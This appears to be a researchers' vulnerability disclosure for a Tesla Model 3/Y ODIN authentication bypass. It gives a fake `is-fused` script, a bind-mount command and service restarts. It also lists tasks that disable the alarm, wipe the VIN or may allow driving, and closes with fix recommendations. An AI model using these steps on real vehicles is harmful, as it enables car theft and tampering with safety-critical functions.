# Bind-mount Fake is-fused Script to Use ODIN Without Authentication

**CVE:** Rejected
**CWE:** CWE-807 (Reliance on Untrusted Inputs in a Security Decision)
**Submitted:** November 19, 2021
**Affected:** Tesla Model 3/Y (Intel MCU), likely Model S/X
**Kernel:** Linux ice 4.14.235-PLK #1 SMP PREEMPT (x86_64)
**Firmware:** 2021.32.22
**Status:** No fix confirmed (no CVE issued)
**Reward:** No reward issued

## Testing Environment

| Field | Value |
|-------|-------|
| Vehicle | Tesla Model 3 |
| MCU | Intel Atom (x86_64) |
| Kernel | 4.14.235-PLK |
| Firmware | 2021.32.22 |
| Access | SSH (requires prior root access) |
| Date | November 2021 |

## Description

An attacker who has obtained root access on a Tesla vehicle can bind-mount a fake `is-fused` script over `/usr/bin/is-fused` to make ODIN believe the unit is unfused. After restarting the ODIN services, any ODIN task can be executed without authentication tokens.

ODIN checks whether the unit is "fused" (production) or "unfused" (factory/development) via the `is-fused` script. On a fused unit, ODIN requires valid authentication tokens for task execution. By replacing this check with a script that always returns "unfused," all authentication requirements are bypassed.

## Steps for Reproduction

### 1. Create a fake is-fused script

With root access, create a modified version of `/usr/bin/is-fused` that always returns unfused:

```bash
#!/bin/sh
FUSE_SENTINEL=/var/lib/car_creds/eom_fuse_sentinel

while true; do
    case "$1" in
        --no-fuse-sentinel)
            SKIP_FUSE_SENTINEL=1; shift 1
            ;;
        *)
            break
            ;;
    esac;
done

COUNT=30
while ! FUSE=$(echo "0"); do
    COUNT=$((COUNT - 1)); [ "$COUNT" -eq 0 ] && break; sleep 0.1;
done

exit 0
```

### 2. Bind-mount over the original

```bash
mount --bind /home/tesla/is-fused /usr/bin/is-fused
```

### 3. Restart ODIN services

```bash
sv restart odin-cef
sv restart odin-engine
```

ODIN now accepts any task execution without authentication tokens.

## Impact

This vulnerability allows anyone with root access to execute any ODIN task without authentication. This is especially dangerous given the level of access ODIN provides to critical vehicle functions.

For example, an attacker could:

- Run `PROC_ICE_X_SET-DATA-VALUE` to disable the car alarm
- Run `PROC_ICE_X_DEASSOCIATE-PRODUCT-ID` to wipe the VIN from the car, making it more difficult to track
- Run potentially safety-critical ODIN tasks such as `CID_COMMAND_DRIVE_ALLOWED` — when in unfused mode, ODIN allows tasks in the `lib` folder of each network to be executed. This command was not tested, but it appears it would allow the executor to put the car into drive.

Additionally, the `CID_COMMAND_DRIVE_ALLOWED` library task is not referenced by any other tasks, suggesting it may be vestigial and could be removed from production vehicles.

## Recommendations

- Instead of relying on the `is-fused` shell script in `/usr/bin/`, the ODIN binary should query the fuse state directly from hardware to determine whether tasks should be allowed without authorization.
- Remove the `CID_COMMAND_DRIVE_ALLOWED` library task from production vehicles, as it is unreferenced and presents unnecessary risk.

---

**Researchers:** Matthew C. Pilsbury, Alex Harbuzenko, Oleg Kutkov
Research conducted at SourceHat Labs Inc.
